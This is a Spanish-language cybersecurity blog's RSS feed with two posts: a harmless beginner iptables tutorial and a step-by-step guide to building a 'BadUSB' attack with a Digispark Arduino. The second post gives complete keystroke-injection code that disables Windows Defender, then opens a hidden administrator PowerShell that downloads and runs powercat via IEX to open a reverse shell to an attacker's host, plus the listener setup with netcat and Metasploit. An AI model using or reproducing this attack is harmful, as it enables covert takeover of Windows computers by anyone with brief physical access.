<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
	xmlns:georss="http://www.georss.org/georss"
	xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
	>

<channel>
	<title>th3-m0th</title>
	<atom:link href="./index.html" rel="self" type="application/rss+xml" />
	<link>./../index.html</link>
	<description>Un blog sobre ciberseguridad y desarrollo de software.</description>
	<lastBuildDate>Wed, 22 Feb 2023 12:19:58 +0000</lastBuildDate>
	<language>es</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.2</generator>
<site xmlns="com-wordpress:feed-additions:1">215802445</site>	<item>
		<title>IPTABLES para novatos</title>
		<link>./../iptables-para-novatos/index.html</link>
					<comments>./../iptables-para-novatos/index.html#comments</comments>
		
		<dc:creator><![CDATA[th3-m0th]]></dc:creator>
		<pubDate>Thu, 16 Feb 2023 09:18:29 +0000</pubDate>
				<category><![CDATA[Linux]]></category>
		<category><![CDATA[Blue Team]]></category>
		<category><![CDATA[cli]]></category>
		<category><![CDATA[Networking]]></category>
		<category><![CDATA[GNU/Linux]]></category>
		<category><![CDATA[iptables]]></category>
		<category><![CDATA[sysadmin]]></category>
		<guid isPermaLink="false">https://localhost/wordpress/?p=38</guid>

					<description><![CDATA[Explicamos qué es iptables, cómo funciona y cómo configurar un sistema mediante iptables.]]></description>
										<content:encoded><![CDATA[
<h2 class="wp-block-heading" id="lo-primero-¿qué-es-iptables">Lo primero: ¿Qué es iptables?</h2>



<p><code>iptables</code> es un programa <code>CLI</code> (Command Line Interface / Por interfaz de comandos) que hace de interfaz al programa <code>netfilter</code>, estos programas se encargan de configurar el cortafuegos del núcleo de sistemas GNU/Linux mediante <strong>reglas</strong>.</p>



<ul>
<li>Existen frontends gráficos para interactuar con <code>iptables</code>.</li>



<li><code>iptables</code> se usa para IPv4 y <code>ip6tables</code> para IPv6.</li>



<li>Podemos anidar tantas cadenas como queramos.</li>



<li>Una regla puede ser simplemente un puntero a la cadena.</li>
</ul>



<p>Seguramente ahora mismo estarás pensando: ¿Para qué me voy a complicar la vida si tengo <code>firewalld</code> o <code>ufw</code>?
Y entiendo tu inquietud, hay casos en los que realmente no prima usar <code>iptables</code> en sobre otro cortafuegos pero <code>iptables</code> es mucho más configurable que cualquiera de ellos, haciéndolo mucho más versátil y flexible a tus necesidades.</p>



<h3 class="wp-block-heading" id="arquitectura-de-iptables">Arquitectura de iptables:</h3>



<p><code>iptables</code> usa tablas para organizar sus reglas. Estas tablas clasifican reglas en base al tipo de decisiones que se van a tomar. Como ejemplo, si una regla filtra un tipo de paquetes en específico se pondrá en la tabla <code>filter</code>.
En cada tabla las reglas se organizan en distintas <strong>cadenas</strong>. 
Las cadenas permiten al administrador controlar donde en la entrega de un paquete se evaluará una regla.</p>



<h4 class="wp-block-heading" id="cadenas">Cadenas</h4>



<p>Hay 5 cadenas en <code>iptables</code> y cada una se encarga de una tarea en específico. Son responsables de los paquetes desde que llegan hasta que o se reenvían, descartan o procesan. Estas cadenas son:
<code>PREROUTING</code>, <code>INPUT</code>, <code>FORWARD</code>, <code>OUTPUT</code>, <code>POSTROUTING</code>.</p>



<h4 class="wp-block-heading" id="tablas">Tablas</h4>



<p>Cada tabla se encarga de una cosa distinta. Hay otras 5 tablas: <code>filter</code>, <code>nat</code>, <code>mangle</code>, <code>raw</code> y <code>security</code>. Las dos primeras son las que más se usan. </p>



<ul>
<li><code>filter</code> es la más usada, se encarga de decidr si un paquete debe continuar su camino o perecer en el intento. </li>



<li><code>nat</code> se usa para redireccionar paquetes de una máquina a otra (en resumen que podemos usar una máquina como router). </li>



<li><code>mangle</code> puede ser usado para alterar la cabecera de un paquete IP de distintas maneras, se puede usar para cosas como por ejemplo ajustar el TTL (Time To Live) de un paquete. Otro tipo de cabeceras se pueden modificar de la misma manera.</li>



<li><code>raw</code> se usa para configurar excepciones del seguimiento de conexiones. </li>



<li><code>security</code> se usa para gestionar reglas especiales.</li>
</ul>



<figure class="wp-block-table aligncenter"><table><tbody><tr><td class="has-text-align-center" data-align="center"><strong>Tablas</strong></td><td><strong>PREROUTING</strong></td><td><strong>INPUT</strong></td><td><strong>FORWARD</strong></td><td><strong>OUTPUT</strong></td><td><strong>POSTROUTING</strong></td></tr><tr><td class="has-text-align-center" data-align="center">filter</td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td></tr><tr><td class="has-text-align-center" data-align="center">nat</td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td></tr><tr><td class="has-text-align-center" data-align="center">mangle</td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td></tr><tr><td class="has-text-align-center" data-align="center">raw</td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td></tr><tr><td class="has-text-align-center" data-align="center">security</td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/2705.png?resize=20%2C20&#038;ssl=1" alt="white_check_mark" width="20" height="20"  data-recalc-dims="1"></td><td><img decoding="async" src="https://i0.wp.com/github.githubassets.com/images/icons/emoji/unicode/274c.png?resize=20%2C20&#038;ssl=1" alt="x" width="20" height="20"  data-recalc-dims="1"></td></tr></tbody></table><figcaption class="wp-element-caption">Tabla ilustrativa del uso de las distintas cadenas</figcaption></figure>



<p>El usuario puede crear sus propias <strong>cadenas</strong> dentro de cada <strong>tabla</strong> para organizar reglas. Las reglas se ejecutan de manera <strong>secuencial</strong> y tienen una <strong>jerarquía</strong>, la última es la que prevalece sobre la anterior, por lo que si en una deniego el acceso a por ejemplo un protocolo en específico y en la siguiente lo habilito será posible hacer uso de ese protocolo.</p>



<h3 class="wp-block-heading">Parámetros comunes de iptables:</h3>



<ul>
<li><code>iptables -A</code>: Append, añadir una regla.</li>



<li><code>iptables -D</code>: Borrar una regla.</li>



<li><code>iptables -F</code>: Eliminta <strong>todas</strong> las reglas.</li>



<li><code>iptables -P</code>: Modifica las políticas de una cadena.</li>



<li><code>iptables -L</code>: Lista todas las reglas.</li>



<li><code>iptables -N</code>: Crea una cadena de un usuario.</li>



<li><code>iptables -R</code>: Reemplaza una regla.</li>



<li><code>iptables -X</code>: Elimina una cadena definida por un usuario.</li>



<li><code>iptables -t &lt;table&gt;</code>: Selecciona la tabla que se va a manipular.</li>
</ul>



<div class="wp-block-group is-layout-constrained">
Ejercicio: Elimina las reglas en la tabla NAT:
<details close="">
<summary>Solución:</summary>
    <code>
        iptables -t nat -F
    </code>
</details>
<br>
</div>



<p>Para ver una lista de todos los argumentos que se pueden usar en <code>iptables</code> recomiendo leer el sagrado <code>man iptables</code> para buscar en profundidad algún parámetro que te haga falta o <code>iptables --help</code> para una lista de los parámetros comunes del programa.</p>



<h3 class="wp-block-heading"><a href="https://github.com/th3-m0th/blog.th3-m0th.github.io/blob/main/_posts/2023-01-27-IPTABLES.md#reglas" target="_blank" rel="noopener"></a></h3>



<h3 class="wp-block-heading">Reglas</h3>



<ul>
<li><code>-i</code>: Interfaz de red por donde entrará el paquete. Solo se puede usar para <code>INPUT</code>, <code>FORWARD</code> y <code>PREROUTING</code>.</li>



<li><code>-o</code>: Iterfaz de red por donde saldrá el paquete.</li>



<li><code>-s 0.0.0.0/0</code>: Permite comparar los paquetes entrantes que vienen de una dirección. (En este caso cualquiera).</li>



<li><code>-d</code>: Compara los paquetes salientes que llegan de la dirección de origen, la IP se puede sustituir por un hostname tanto en -s como en -d (Porque al fin y al cabo te lo va a resolver el DNS).</li>



<li><code>-p</code>: Tipo de protocolo a usar que será comparado con la regla.</li>



<li><code>-sport</code>: Puerto de origen. Se puede especificar un rango usando &#8216;:&#8217; ejemplo: 1090:65535</li>



<li><code>-dport</code>: Puerto de destino.</li>



<li><code>-m</code>: Se aplica la regla si se cumple una condición específica.</li>



<li><code>-j</code>: Destino de la regla:</li>
</ul>



<figure class="wp-block-table"><table><thead><tr><th>Destino</th><th>Información</th></tr></thead><tbody><tr><td>ACCEPT</td><td>Acepta la conexión</td></tr><tr><td>DROP</td><td>Deniega el acceso</td></tr><tr><td>QUEUE</td><td>Envía el paquete a las reglas del usuario</td></tr><tr><td>REJECT</td><td>Rechaza la conexión y envía el paquete a su origen</td></tr></tbody></table></figure>



<ul>
<li><code>LOG</code>: Todos los paquetes que coincidan por esta regla se guardan en un log.</li>



<li><code>SNAT</code>: Un estado virtual donde difiere si la dirección fuente original difiere del envío destinado.</li>



<li><code>DNAT</code>: Un estado virtual donde coincide si el destino difiere del lugar donde son reenviados.</li>
</ul>



<p></p>



<h3 class="wp-block-heading" id="políticas">Políticas</h3>



<p>En este apartado veremos algunos ejemplos sobre como aplicar políticas en <code>iptables</code>.</p>



<ul>
<li>Denegar el tráfico entrante:
<code>iptables -P INPUT DROP</code></li>



<li>Denegar el tráfico saliente:
<code>iptables -P OUTPUT DROP</code></li>



<li>Denegar el reenvío de paquetes: <code>iptables -P FORWARD DROP</code></li>
</ul>



<p>Eso sería todo, muchas gracias por leer, 
<code>Happy Hacking!</code></p>



<p><em>Si encuentras algún error o errata házmelo saber.</em></p>



<p></p>



<h2 class="wp-block-heading">¡Suscríbete a nuestra Newsletter!</h2>


<div class="wp-block-jetpack-contact-form"><a href="./../iptables-para-novatos/index.html" target="_blank" rel="noopener noreferrer">Envía un formulario.</a></div>]]></content:encoded>
					
					<wfw:commentRss>./../iptables-para-novatos/feed/index.html</wfw:commentRss>
			<slash:comments>2</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">38</post-id>	</item>
		<item>
		<title>Reverse shells en arduino</title>
		<link>./../reverse-shells-en-arduino/index.html</link>
					<comments>./../reverse-shells-en-arduino/index.html#respond</comments>
		
		<dc:creator><![CDATA[th3-m0th]]></dc:creator>
		<pubDate>Thu, 16 Feb 2023 08:47:38 +0000</pubDate>
				<category><![CDATA[Red Team]]></category>
		<category><![CDATA[Hardware]]></category>
		<category><![CDATA[Pentesting]]></category>
		<category><![CDATA[Windows]]></category>
		<category><![CDATA[digispark]]></category>
		<category><![CDATA[reverse-shell]]></category>
		<category><![CDATA[shell]]></category>
		<guid isPermaLink="false">https://localhost/wordpress/?p=29</guid>

					<description><![CDATA[En este post vamos a reprogramar un controlador Arduino para que se comporte como un dispositivo HID (vamos como un teclado) para que lance una serie de comandos que nos permitan acceder a la shell de un dispositivo Windows 11 en la misma red. No me hago responsable de los daños que pueda causar el [&#8230;]]]></description>
										<content:encoded><![CDATA[
<p>En este post vamos a reprogramar un controlador Arduino para que se comporte como un dispositivo HID (vamos como un teclado) para que lance una serie de comandos que nos permitan acceder a la shell de un dispositivo Windows 11 en la misma red. </p>



<blockquote class="wp-block-quote has-dark-bg-to-accent-2-gradient-background has-background">
<p>No me hago responsable de los daños que pueda causar el mal uso de este tutorial, la responsabilidad recaerá en quién haga uso de estas técnicas con finalidades no éticas. </p>
</blockquote>



<h3 class="wp-block-heading" id="el-controlador">El controlador</h3>



<p>Para este tutorial usaremos un microcontrolador compatible con Arduino llamado <strong>Digispark ATTiny85</strong> se puede encontrar en tiendas como Aliexpress por 2€.  </p>



<figure class="wp-block-image size-large"><img decoding="async" src="https://i0.wp.com/github.com/th3-m0th/blog.th3-m0th.github.io/raw/main/assets/img/2023-01-09/attiny85.jpeg?ssl=1" alt="Fotografía del microcontrolador" data-recalc-dims="1"/></figure>



<p>Para que la placa funcione con el <a href="https://www.arduino.cc/en/software" target="_blank" rel="noopener">Arduino IDE</a> deberemos instalar los &#8216;drivers&#8217; del microcontrolador. Para instalarlos deberás acceder a «Archivo»&gt;»Preferencias» y en «Gestor de URLs adicionales de tarjetas» añadiremos la siguiente URL: <code>http://digistump.com/package_digistump_index.json</code> </p>



<figure class="wp-block-image size-full"><img decoding="async" width="889" height="508" src="https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/preferencias.png?resize=889%2C508&#038;ssl=1" alt="Fotografía ilustrativa" class="wp-image-121" srcset="https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/preferencias.png?w=889&amp;ssl=1 889w, https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/preferencias.png?resize=300%2C171&amp;ssl=1 300w, https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/preferencias.png?resize=768%2C439&amp;ssl=1 768w" sizes="(max-width: 889px) 100vw, 889px" data-recalc-dims="1" /></figure>



<p>  Después de haber añadido el URL pulsaremos en «Herramientas»&gt;»Placas»&gt;»Gestor de tarjetas». <img decoding="async" src="/assets/img/2023-01-09/gestor_placas.png" alt=""></p>



<figure class="wp-block-image size-full"><img decoding="async" width="660" height="720" src="https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/2.png?resize=660%2C720&#038;ssl=1" alt="Fotografía ilustrativa" class="wp-image-122" srcset="https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/2.png?w=660&amp;ssl=1 660w, https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/2.png?resize=275%2C300&amp;ssl=1 275w" sizes="(max-width: 660px) 100vw, 660px" data-recalc-dims="1" /></figure>



<p>Y en el gestor de tarjetas buscaremos «Digistump AVR Boards» y pulsaremos instalar.</p>



<figure class="wp-block-image size-full"><img decoding="async" width="793" height="448" src="https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/3.png?resize=793%2C448&#038;ssl=1" alt="Fotografía ilustrativa" class="wp-image-123" srcset="https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/3.png?w=793&amp;ssl=1 793w, https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/3.png?resize=300%2C169&amp;ssl=1 300w, https://i0.wp.com/th3-m0th.es/wp-content/uploads/2023/02/3.png?resize=768%2C434&amp;ssl=1 768w" sizes="(max-width: 793px) 100vw, 793px" data-recalc-dims="1" /></figure>



<p>Por ahora iba todo genial pero hay un problema, la librería «DigiKeyboard.h» que se encarga de convertir el microcontrolador en un teclado viene en distribución de teclado americano por lo que si intentamos de explotar un sistema con la distribución de teclado español tendremos problemas.</p>



<p>Realmente tiene facil solución gracias a <a href="https://github.com/Dasor/digispark-keyboard-layout-Spanish" target="_blank" rel="noopener">este repo de github</a></p>



<p>Nos podemos bajar los ficheros «DigiKeyboard.h» y «scancode-ascii-table.h» usando <code>curl</code> o <code>wget</code>. En mi caso usaré curl.</p>



<pre class="wp-block-code"><code>curl -s -o DigiKeyboard.h https://raw.githubusercontent.com/Dasor/digispark-keyboard-layout-Spanish/master/DigiKeyboard.h
curl -s -o scancode-ascii-table.h https://raw.githubusercontent.com/Dasor/digispark-keyboard-layout-Spanish/master/scancode-ascii-table.h
</code></pre>



<blockquote class="wp-block-quote has-dark-bg-to-accent-3-gradient-background has-background">
<p>Si usas Windows debes de reemplazar <code>curl</code> por <code>curl.exe</code> ya que las versiones recientes de Windows incluyen esta herramienta de manera predeterminada. </p>
</blockquote>



<p>Luego deberemos reemplazar los archivos que acabamos de descargar por los de la librería DigisparkKeyboard. Solo tendríamos que reemplazar los archivos en </p>



<pre class="wp-block-code"><code>(Linux) $HOME/.arduino/packages/digistump/hardware/avr/(versión)/libraries/DigisparkKeyboard/
</code></pre>



<pre class="wp-block-code"><code>(Windows) C:\Users\(NombreDeUsuario)\AppData\Local\Arduino15\packages\digistump\hardware\avr\(version)\libraries\DigisparkKeyboard\
</code></pre>



<p>Con esto ya podemos explotar sistemas españoles(o usando una distribución de teclado española).</p>



<h3 class="wp-block-heading" id="picando-código">Picando código</h3>



<p>Al principio del archivo se importa la librería <code>DigiKeyboard.h</code> y se definen distintas teclas que usaremos más tarde (Esc, Tab, Space).</p>



<pre class="wp-block-code"><code>#include "DigiKeyboard.h"

#define KEY_ESC     41 
#define KEY_TAB     43
#define KEY_SPACE   44
</code></pre>



<p>Inicializamos el LED para que nos informe al terminar el ataque y lo dejamos apagado.</p>



<pre class="wp-block-code"><code>void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);
}
</code></pre>



<p>Para poder crear una reverse shell deberemos de desactivar Windows Defender, de esto se encarga la función <code>disarm_defender()</code>.</p>



<pre class="wp-block-code"><code>void disarm_defender() {
  // abre el buscador de windows
  DigiKeyboard.sendKeyStroke(KEY_ESC, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(700);

  // abre la configuración de seguridad
  DigiKeyboard.print(F("seguridad"));
  DigiKeyboard.delay(700);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // deshabilita la protección a tiempo real
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // cierra la ventana
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
  }
</code></pre>



<p>Con esto ya Windows nos permitiría correr el siguiente snippet de código en powershell. </p>



<pre class="wp-block-code"><code>PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}
</code></pre>



<p>Vamos a analizarlo:</p>



<pre class="wp-block-code"><code>PowerShell.exe -WindowStyle hidden{}
</code></pre>



<p>Ejecuta las instrucciones dentro de las llaves y esconde la terminal de PowerShell de manera que no la detecte el usuario.</p>



<pre class="wp-block-code"><code>powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');"
</code></pre>



<p>Como posteriormente veremos, para realizar este ataque tendremos que crear un servidor HTTP en caso de que el objetivo no tenga conexión a Internet para que se descargue powercat (Lo usaremos para crear la reverse shell porque es fácil de manejar y porque normalmente las máquinas Windows no tienen Netcat instalado). Si sabes que el objetivo tiene conexión a Internet, a lo mejor te es más conviniente introducir el URL del archivo powercat.ps1 <code>https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1</code>. En resumen, este snippet sirve para bajarse el fichero powercat.ps1 ya sea de un servidor que hostea el atacante o del propio repositorio de Github.</p>



<pre class="wp-block-code"><code>powercat -c (IP) -p (PUERTO) -e powershell\
</code></pre>



<p>Este snippet sirve para conectarnos al atacante lanzando un intérprete de powershell (Deberemos de poner la IP del atacante y el puerto que está en escucha en la máquina atacante). Esto hace que el atacante tome control del sistema ya que como ahora veremos vamos a conseguir lanzar este snippet como administrador.</p>



<p>Con el siguiente código abriríamos powershell y ejecutaríamos el comando con perisos de administrador.</p>



<pre class="wp-block-code"><code>void create_reverse_shell (){
    //abre powershell con permisos de administrador
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.print(F("powershell"));
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT|MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(1500);
    // RECORDATORIO: Puedes cambiar el URL al archivo de powercat si el objetivo tiene conexión a internet. (Así nos ahorramos tener el servidor HTTP)
    DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
    // esconde la ventana al usuario y nos permite tomar el control completo del sistema
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
</code></pre>



<p>Lo que resta para terminar el programa es añadir el método <code>loop()</code>. Este método se encargará de lanzar las funciones definidas anteriormente y cuando termine apagará y encenderá el LED del microcontrolador.</p>



<pre class="wp-block-code"><code>void loop() {
  DigiKeyboard.sendKeyStroke(0);
  
  disarm_defender();
  create_reverse_shell();
  
  while (true){
      digitalWrite(1, HIGH);
      delay(300);
      digitalWrite(1, LOW);
      delay(300);
  }
}
</code></pre>



<p>Os dejo el código en <a href="https://github.com/404a10/reverse-shell-arduino" target="_blank" rel="noopener">mi perfil de Github</a>.</p>



<p>Flasheamos el código al microcontrolador y preparamos el lado del atacante.</p>



<h3 class="wp-block-heading" id="si-sabemos-que-el-objetivo-no-tiene-conexión-a-internet">Si sabemos que el objetivo no tiene conexión a Internet</h3>



<p>Nos descargaremos el archivo de powercat a un directorio y desde ahí montaremos un servidor HTTP en el que serviremos el archivo para que la víctima pueda descargarlo para posteriormente ejecutarlo. Necesitaríamos tener instalado <code>python3</code>.
Navegas al directorio en el que esté el archivo y servirlo usando </p>



<pre class="wp-block-code"><code>python3 -m  http.server 80
</code></pre>



<p><strong>Recordatorio:</strong>
Para que esto funcione deberás de cambiar la parte del programa que se encarga de ejecutar el snippet en powershell para que descargue powercat desde el servidor HTTP.
Cambiamos de esto:</p>



<pre class="wp-block-code"><code>DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
</code></pre>



<p>A esto:</p>



<pre class="wp-block-code"><code>DigiKeyboard.print("PowerShell.exe -WindowStyle hidden {powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://(IP)/powercat.ps1');powercat -c (IP) -p (PUERTO) -e powershell\"}");
</code></pre>



<h3 class="wp-block-heading" id="esperar-a-la-conexión">Esperar a la conexión</h3>



<p>Como ya sabrás, el atacante debe esperar la conexión del cliente, para esperar la conexión que generará la máquina víctima al conectarse el microcontrolador.</p>



<p>Podemos esperar la conexión del atacante usando herramientas como <code>netcat</code> y <code>metasploit</code>. Para esperar a conexiones entrantes en <code>netcat</code> podríamos hacerlo de esta manera:</p>



<pre class="wp-block-code"><code>nc -lvp (PUERTO)
</code></pre>



<p>El parámetro -l sirve para esperar a conexiones entrantes, -v es para activar la verbosa y poder ver más información en la pantalla mientras que -p sirve para especificar el puerto en el que estamos escuchando.</p>



<p>Usando metasploit podríamos hacerlo de la siguiente manera:</p>



<pre class="wp-block-code"><code>msfconsole
use exploit/multi/handler
set LHOST (IP de la interfaz del atacante conectada a la red de la victima)
set LPORT (PUERTO en el que queremos recibir conexiones)
run
</code></pre>



<p>Esto sería todo, muchas gracias por leer, </p>



<p><code>Happy Hacking!</code></p>



<p><em>Si encuentras algún error o errata házmelo saber.</em></p>


<div class="wp-block-jetpack-contact-form"><a href="./../reverse-shells-en-arduino/index.html" target="_blank" rel="noopener noreferrer">Envía un formulario.</a></div>


<p></p>
]]></content:encoded>
					
					<wfw:commentRss>./../reverse-shells-en-arduino/feed/index.html</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">29</post-id>	</item>
	</channel>
</rss>
